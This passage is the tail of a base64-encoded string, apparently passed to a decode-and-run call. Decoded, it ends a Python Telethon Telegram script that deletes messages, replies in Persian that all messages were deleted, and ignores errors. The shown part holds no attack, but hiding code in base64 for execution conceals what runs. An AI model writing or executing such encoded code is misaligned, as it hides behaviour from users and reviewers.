ICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZGVsZXRlX21lc3NhZ2VzKCkKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoItiq2YXYp9mFINm+24zYp9mFINmH2Kcg2K3YsNmBINi02K8gLiIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAjcHJpbnQoZXZlbnQuanNvbmlmeShpbmRlbnQ9MikpCiAgICAgICAgYXdhaXQgY2xpZW50LnJ1bl91bnRpbF9kaXNjb25uZWN0ZWQoKQoKYXN5bmNpby5ydW4obWFpbigpKQo="))
